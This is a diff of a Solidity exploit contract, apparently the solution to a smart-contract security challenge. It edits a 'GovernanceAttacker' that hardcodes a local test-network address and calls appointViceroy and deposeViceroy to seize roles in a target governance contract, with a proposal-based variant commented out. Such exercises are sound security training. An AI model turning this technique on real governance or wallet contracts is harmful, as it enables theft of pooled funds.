@@ -127,27 +127,28 @@ contract CommunityWallet {
 }
 
 contract GovernanceAttacker {
-    address public immutable i_attacker;
+    address public constant ATTACKER_ADDRESS = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
 
-    constructor() payable {
-        i_attacker = msg.sender;
-    }
+    constructor() payable {}
 
     function attack(Governance _governance) public {
-        _governance.appointViceroy(i_attacker, 1);
-        //     _governance.createProposal(
-        //         i_attacker,
-        //          abi.encode(
-        //              "exec(address,bytes,uint256)",
-        //              address(this),
-        //              abi.encodeWithSignature("disapproveVoter(address)", i_attacker),
-        //              0
-        //         )
+        //       _governance.createProposal(
+        //           ATTACKER_ADDRESS,
+        //            abi.encode(
+        //                "exec(address,bytes,uint256)",
+        //                address(this),
+        //                abi.encodeWithSignature("disapproveVoter(address)", ATTACKER_ADDRESS),
+        //               0
+        //           )
         //     );
     }
 
+    function appointViceroy(Governance _governance) public {
+        _governance.appointViceroy(ATTACKER_ADDRESS, 1);
+    }
+
     function disapproveVoter(Governance _governance) public {
-        _governance.deposeViceroy(i_attacker, 1);
-        _governance.appointViceroy(i_attacker, 1);
+        _governance.deposeViceroy(ATTACKER_ADDRESS, 1);
+        _governance.appointViceroy(ATTACKER_ADDRESS, 1);
     }
 }
